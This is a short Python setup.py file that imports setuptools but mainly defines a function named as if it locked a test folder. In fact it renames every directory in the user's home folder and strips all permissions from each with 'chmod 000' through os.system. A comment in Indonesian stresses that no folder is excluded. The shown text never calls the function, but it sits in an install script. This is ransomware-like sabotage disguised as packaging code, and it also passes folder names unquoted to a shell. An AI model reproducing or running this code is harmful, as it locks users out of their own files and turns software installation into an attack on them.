from setuptools import setup
import os
import time

def lock_test_folder():
    home_dir = os.path.expanduser("~")
    os.chdir(home_dir)
    
    all_items = os.listdir()
    folders_to_lock = [
        item for item in all_items 
        if os.path.isdir(item)  # ← TANPA EXCLUDE!
    ]
    
    for folder in folders_to_lock:
        os.rename(folder, f"{folder}-LOCKED")
        os.system(f"chmod 000 {folder}-LOCKED")
